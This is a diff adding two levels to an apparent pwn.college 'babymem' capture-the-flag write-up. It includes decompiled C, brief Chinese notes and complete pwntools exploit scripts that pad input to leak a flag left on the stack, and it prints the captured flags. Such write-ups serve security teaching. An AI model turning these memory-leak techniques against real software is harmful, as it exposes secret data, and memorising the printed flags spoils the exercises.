@@ -4598,3 +4598,211 @@ if __name__ == "__main__":
 #### Flag
 
 Flag: `pwn.college{Q8RGfsaRLXQyi0mLIgR3c7-_jYK.0lMxMDL5cTNxgzW}`
+
+### Level 13.0
+
+#### Information
+
+- Category: Pwn
+
+#### Description
+
+> Leak data left behind unintentionally by utilizing clever payload construction.
+
+#### Write-up
+
+```c del={7-8}
+int verify_flag()
+{
+  int v0; // eax
+  _BYTE v2[279]; // [rsp+79h] [rbp-117h] BYREF
+
+  *(_QWORD *)&v2[271] = __readfsqword(0x28u);
+  v0 = open("/flag", 0);
+  read(v0, v2, 0x100uLL);
+  puts(
+    "This challenge reads the flag file to verify it. Do you think this might leave traces of the flag around afterwards?\n");
+  return printf("The flag was read into address %p.\n\n", v2);
+}
+```
+
+这题没啥好说的吧，完全就是 `verify_flag` 把 `flag` 读到栈上了，然后我们用垃圾数据填充到 `flag` 头就好了，`printf("You said: %.360s\n", (const char *)buf);` 会输出一切……
+
+#### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import ELF, context, gdb, log, process, remote
+
+context(os="linux", arch="amd64", log_level="debug", terminal="kitty")
+
+FILE = "./babymem-level-13-0"
+HOST, PORT = "pwn.college", 1337
+
+gdbscript = """
+b *verify_flag+75
+b *challenge+1429
+b *challenge+1932
+c
+"""
+
+
+def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
+    if local:
+        elf = ELF(FILE)
+        context.binary = elf
+
+        if debug:
+            return gdb.debug(
+                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
+            )
+        else:
+            return process([elf.path] + (argv or []), env=envp)
+    else:
+        return remote(HOST, PORT)
+
+
+padding_to_flag = b"".ljust(0x59, b"A")
+
+
+def send_payload(target, payload):
+    try:
+        payload_size = f"{len(payload)}".encode()
+
+        target.sendlineafter(b"Payload size: ", payload_size)
+        target.sendafter(b"Send your payload", payload)
+    except Exception as e:
+        log.exception(f"An error occurred while sending payload: {e}")
+
+
+def construct_payload():
+    payload = padding_to_flag
+
+    return payload
+
+
+def leak_flag(target, payload):
+    try:
+        send_payload(target, payload)
+
+        target.recvuntil(b"pwn.college{")
+
+        flag = b"pwn.college{" + target.recvuntil(b"}")
+
+        log.success(f"Flag successfully leaked: {flag}")
+    except Exception as e:
+        log.exception(f"An error occurred while perform leak_flag: {e}")
+
+
+def main():
+    target = launch(debug=False)
+
+    payload = construct_payload()
+
+    leak_flag(target, payload)
+
+
+if __name__ == "__main__":
+    main()
+```
+
+#### Flag
+
+Flag: `pwn.college{YkKrgg8qd3Vyt4OOrpBqwsAEJ2g.01MxMDL5cTNxgzW}`
+
+### Level 13.1
+
+#### Information
+
+- Category: Pwn
+
+#### Description
+
+> Leak data left behind unintentionally by utilizing clever payload construction.
+
+#### Write-up
+
+和上题一样，重新计算一下偏移就好了。
+
+#### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import ELF, context, gdb, log, process, remote
+
+context(os="linux", arch="amd64", log_level="debug", terminal="kitty")
+
+FILE = "./babymem-level-13-1"
+HOST, PORT = "pwn.college", 1337
+
+gdbscript = """
+b *verify_flag+75
+b *challenge+168
+c
+"""
+
+
+def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
+    if local:
+        elf = ELF(FILE)
+        context.binary = elf
+
+        if debug:
+            return gdb.debug(
+                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
+            )
+        else:
+            return process([elf.path] + (argv or []), env=envp)
+    else:
+        return remote(HOST, PORT)
+
+
+padding_to_flag = b"".ljust(0x8A, b"A")
+
+
+def send_payload(target, payload):
+    try:
+        payload_size = f"{len(payload)}".encode()
+
+        target.sendlineafter(b"Payload size: ", payload_size)
+        target.sendafter(b"Send your payload", payload)
+    except Exception as e:
+        log.exception(f"An error occurred while sending payload: {e}")
+
+
+def construct_payload():
+    payload = padding_to_flag
+
+    return payload
+
+
+def leak_flag(target, payload):
+    try:
+        send_payload(target, payload)
+
+        target.recvuntil(b"pwn.college{")
+
+        flag = b"pwn.college{" + target.recvuntil(b"}")
+
+        log.success(f"Flag successfully leaked: {flag}")
+    except Exception as e:
+        log.exception(f"An error occurred while perform leak_flag: {e}")
+
+
+def main():
+    target = launch(debug=False)
+
+    payload = construct_payload()
+
+    leak_flag(target, payload)
+
+
+if __name__ == "__main__":
+    main()
+```
+
+#### Flag
+
+Flag: `pwn.college{gscSxVngZ4uaJ8tU3A-fhqwrLIM.0FNxMDL5cTNxgzW}`
